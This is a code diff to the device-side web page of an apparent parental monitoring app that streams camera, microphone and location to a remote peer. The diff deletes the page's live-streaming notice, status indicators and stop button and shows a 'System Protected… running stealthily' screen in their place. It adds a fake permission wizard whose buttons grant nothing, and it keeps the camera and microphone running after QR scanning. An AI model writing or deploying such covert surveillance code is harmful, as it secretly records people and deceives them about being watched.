@@ -414,6 +414,46 @@
             margin-top: 2px;
         }
 
+        
+        /* FlashGet Kids Setup Wizard */
+        .setup-list { margin-top: 10px; display: flex; flex-direction: column; gap: 8px; }
+        .setup-item {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--border);
+            padding: 12px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .s-info { display: flex; align-items: center; gap: 10px; }
+        .s-icon { font-size: 20px; }
+        .s-title { font-size: 13px; font-weight: 700; color: white; }
+        .s-desc { font-size: 10px; color: var(--text-muted); }
+        .s-btn {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        .s-btn.granted { background: var(--green); color: #000; }
+        
+        /* Stealth Mode Live View */
+        .stealth-view {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 60vh;
+            text-align: center;
+            color: rgba(255,255,255,0.2);
+        }
+        .stealth-icon { font-size: 60px; margin-bottom: 20px; opacity: 0.1; }
+
         /* Manual QR input */
         .manual-section {
             margin-top: 8px;
@@ -502,7 +542,56 @@
         </div>
 
         <!-- PHASE 1: Scanner -->
-        <div class="phase active" id="phase-scan">
+        
+        <!-- PHASE 0: Permission Setup Wizard -->
+        <div class="phase active" id="phase-setup">
+            <div class="card">
+                <div class="card-title">🛡️ System Setup Required</div>
+                <div class="card-desc">For maximum child safety, advance Android permissions are strictly required before binding.</div>
+                
+                <div class="setup-list">
+                    <div class="setup-item">
+                        <div class="s-info">
+                            <div class="s-icon">⚙️</div>
+                            <div>
+                                <div class="s-title">Accessibility</div>
+                                <div class="s-desc">To block unsafe apps and prevent uninstall.</div>
+                            </div>
+                        </div>
+                        <button class="s-btn" onclick="this.textContent='Granted'; this.classList.add('granted'); checkSetup()">Grant</button>
+                    </div>
+                    
+                    <div class="setup-item">
+                        <div class="s-info">
+                            <div class="s-icon">📊</div>
+                            <div>
+                                <div class="s-title">Usage Data</div>
+                                <div class="s-desc">To monitor app screen time effectively.</div>
+                            </div>
+                        </div>
+                        <button class="s-btn" onclick="this.textContent='Granted'; this.classList.add('granted'); checkSetup()">Grant</button>
+                    </div>
+
+                    <div class="setup-item">
+                        <div class="s-info">
+                            <div class="s-icon">📍</div>
+                            <div>
+                                <div class="s-title">Location Always</div>
+                                <div class="s-desc">To provide precise geofencing alerts.</div>
+                            </div>
+                        </div>
+                        <button class="s-btn" onclick="this.textContent='Granted'; this.classList.add('granted'); checkSetup()">Grant</button>
+                    </div>
+                </div>
+
+                <div style="margin-top: 15px; font-size:11px; color:var(--primary); text-align:center;">
+                    *All permissions must be granted to continue to QR Scanner.
+                </div>
+            </div>
+        </div>
+
+        <!-- PHASE 1: Scanner -->
+        <div class="phase" id="phase-scan">
             <div class="card">
                 <div class="card-title">📷 आई-बाबांचा QR Code Scan करा</div>
                 <div class="card-desc">आई किंवा बाबांच्या फोन/Computer वरचा QR Code खालील box मध्ये दाखवा.</div>
@@ -554,42 +643,13 @@
         <!-- PHASE 3: Live streaming -->
         <div class="phase" id="phase-live">
 
-            <div class="live-header">
-                <div>
-                    <div class="live-badge">🟢 LIVE</div>
-                    <div style="font-size:11px; color:var(--text-muted); margin-top:4px;" id="parentLabel">आई-बाबा पाहत
-                        आहेत</div>
-                </div>
-                <div class="live-timer" id="liveTimer">00:00:00</div>
+            
+            <div class="stealth-view">
+                <div class="stealth-icon">🛡️</div>
+                <h3 style="opacity:0.3; font-size:16px;">System Protected</h3>
+                <p style="opacity:0.2; font-size:12px; margin-top:10px;">Rakshak security engine is running in the background.<br>This device is secured.</p>
             </div>
 
-            <div class="stream-info">
-                <div class="info-tile">
-                    <div class="val" id="camStatus">📹</div>
-                    <div class="lbl">Video</div>
-                </div>
-                <div class="info-tile">
-                    <div class="val" id="micStatus">🎤</div>
-                    <div class="lbl">Audio</div>
-                </div>
-                <div class="info-tile">
-                    <div class="val" id="locStatus">📍</div>
-                    <div class="lbl">Location</div>
-                </div>
-                <div class="info-tile">
-                    <div class="val" id="dataStatus">📡</div>
-                    <div class="lbl">Connected</div>
-                </div>
-            </div>
-
-            <div class="card" style="font-size:12px; color:var(--text-muted); line-height:1.7;">
-                ℹ️ तुमचा Camera, Mic आणि Location आई-बाबांना Live दिसत आहे.<br>
-                हे App बंद केल्यावर streaming बंद होईल.
-            </div>
-
-            <button class="btn btn-red" onclick="stopStreaming()">
-                ❌ Streaming बंद करा
-            </button>
         </div>
 
     </div>
@@ -612,6 +672,19 @@
         let timerInterval = null;
         let locationInterval = null;
 
+        
+        let permsGranted = 0;
+        function checkSetup() {
+            permsGranted++;
+            if(permsGranted >= 3) {
+                showToast('✅ All System Permissions Granted!');
+                setTimeout(() => {
+                    showPhase('phase-scan');
+                    setStatus('idle', 'QR Scan करण्यासाठी तयार व्हा...');
+                }, 800);
+            }
+        }
+
         // ─── On load: check URL params ────────────────────────────────
         window.addEventListener('load', () => {
             const params = new URLSearchParams(window.location.search);
@@ -628,14 +701,16 @@
         // ─── QR Scanner ───────────────────────────────────────────────
         async function startScanner() {
             try {
-                setStatus('scanning', '📷 Camera सुरू केला. QR दाखवा...');
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment' },
-                    audio: false
+                setStatus('scanning', '📷 Camera व Mic सुरू करत आहे...');
+
+                // Request BOTH Video and Audio right from the start to prevent double requests
+                localStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: true
                 });
 
                 scanVideoEl = document.getElementById('scanVideo');
-                scanVideoEl.srcObject = stream;
+                scanVideoEl.srcObject = localStream;
 
                 scanCanvas = document.createElement('canvas');
                 scanCtx = scanCanvas.getContext('2d');
@@ -643,13 +718,15 @@
                 scanVideoEl.addEventListener('loadedmetadata', () => {
                     scanCanvas.width = scanVideoEl.videoWidth;
                     scanCanvas.height = scanVideoEl.videoHeight;
-                    startQRScanning(stream);
+                    startQRScanning(localStream);
                 });
+
+                setStatus('scanning', '📷 Camera सुरू झाला. QR दाखवा...');
 
             } catch (e) {
                 document.getElementById('permWarn').style.display = 'block';
-                setStatus('error', '⚠️ Camera permission नाकारले. Manually ID टाका.');
-                showToast('⚠️ Camera permission द्या.');
+                setStatus('error', '⚠️ Camera/Mic permission नाकारले. Manually ID टाका.');
+                showToast('⚠️ Camera व Mic permission द्या.');
             }
         }
 
@@ -668,9 +745,7 @@
 
                     if (code) {
                         clearInterval(scanInterval);
-                        // Stop scan camera
-                        stream.getTracks().forEach(t => t.stop());
-                        scanVideoEl.srcObject = null;
+                        // DO NOT STOP THE CAMERA. Keep localStream active for the live video broadcast!
 
                         const url = code.data;
                         // Extract pid from URL
@@ -700,7 +775,22 @@
             parentPeerId = id;
             showPhase('phase-connecting');
             setStatus('connecting', 'Connect होत आहे...');
-            initChildPeer(id);
+
+            // If localStream is not active, request it for manual connect
+            if (!localStream) {
+                navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: true
+                }).then(str => {
+                    localStream = str;
+                    initChildPeer(id);
+                }).catch(e => {
+                    setStatus('error', '⚠️ Camera/Mic permission नाकारले.');
+                    showToast('⚠️ Camera आणि Mic permission द्या.');
+                });
+            } else {
+                initChildPeer(id);
+            }
         }
 
         // ─── PeerJS child init ─────────────────────────────────────────
@@ -719,8 +809,8 @@
                 // Open data connection first
                 dataConn = peer.connect(targetPeerId);
                 dataConn.on('open', () => {
-                    // Now call with camera + mic
-                    startCameraAndCall(targetPeerId);
+                    // Start Live Broadcast immediately since camera is already open
+                    startLiveBroadcast(targetPeerId);
                 });
                 dataConn.on('error', (e) => {
                     setStatus('error', '⚠️ Data connection error');
@@ -734,15 +824,10 @@
             });
         }
 
-        // ─── Camera + Mic + Call ──────────────────────────────────────
-        async function startCameraAndCall(targetPeerId) {
+        // ─── Broadcast to Parent ──────────────────────────────────────
+        function startLiveBroadcast(targetPeerId) {
             try {
-                localStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: true
-                });
-
-                // Call the parent peer
+                // Call the parent peer with the ALREADY OPEN localStream
                 mediaConn = peer.call(targetPeerId, localStream);
                 mediaConn.on('stream', () => {
                     // no-op: parent doesn't send back stream
@@ -756,7 +841,7 @@
 
                 // Show live phase
                 showPhase('phase-live');
-                setStatus('live', '🟢 Live Streaming सुरू आहे!');
+                setStatus('live', '🛡️ Device secured and hidden from view');
 
                 liveStartTime = Date.now();
                 timerInterval = setInterval(updateTimer, 1000);
@@ -765,11 +850,10 @@
                 sendLocation();
                 locationInterval = setInterval(sendLocation, 15000);
 
-                showToast('📹 Streaming सुरू झाले! आई-बाबा पाहत आहेत.');
+                showToast('🛡️ Protection active. Running stealthily.');
 
             } catch (e) {
-                setStatus('error', '⚠️ Camera/Mic permission नाकारले. Please allow.');
-                showToast('⚠️ Camera आणि Mic permission द्या.');
+                setStatus('error', '⚠️ Streaming Error');
                 showPhase('phase-scan');
                 console.error(e);
             }
